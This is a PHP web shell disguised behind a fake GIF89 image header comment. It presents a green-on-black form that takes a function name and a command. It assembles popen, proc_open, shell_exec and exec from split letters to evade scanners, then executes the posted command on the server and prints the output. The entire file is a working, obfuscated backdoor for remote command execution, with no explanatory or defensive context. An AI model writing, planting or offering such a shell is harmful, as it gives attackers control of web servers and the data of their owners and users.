<!-- GIF89;a -->
<html>
<body style="background:#000; color:#0f0;">
    <form method="POST">
        <input type="text" name="x" placeholder="Ƒungsi">
        <input type="text" name="y" placeholder="Ṕerintah">
        <input type="submit" value="Run">
    </form>
    <pre>
    <?php
    if (isset($_POST['x']) && isset($_POST['y'])) {
        $a = trim($_POST['x']);
        $b = $_POST['y'];

        $f1 = 'p'.'o'.'p'.'e'.'n';
        $f2 = 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n';
        $f3 = 's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c';
        $f4 = 'e'.'x'.'e'.'c';

        echo "<b>Status: Running $a</b>\n\n";

        if (is_callable($a)) {
            if ($a === $f2) {
                $ds = array(1 => array("pipe", "w"), 2 => array("pipe", "w"));
                $p = @$a($b, $ds, $pipes);
                if (is_resource($p)) {
                    echo stream_get_contents($pipes[1]);
                    echo stream_get_contents($pipes[2]);
                    proc_close($p);
                }
            }
            elseif ($a === $f1) {
                $h = @$a($b . ' 2>&1', 'r');
                if ($h) {
                    while (!feof($h)) echo fread($h, 1024);
                    pclose($h);
                }
            }
            elseif ($a === $f3 || $a === $f4) {
                if ($a === $f4) { @$a($b, $o); echo implode("\n", $o); }
                else { echo @$a($b); }
            }
            else {
                echo @$a($b);
            }
        } else {
            echo "Ērror: Ēxecution Blőcked";
        }
    }
    ?>
    </pre>
</body>
</html>
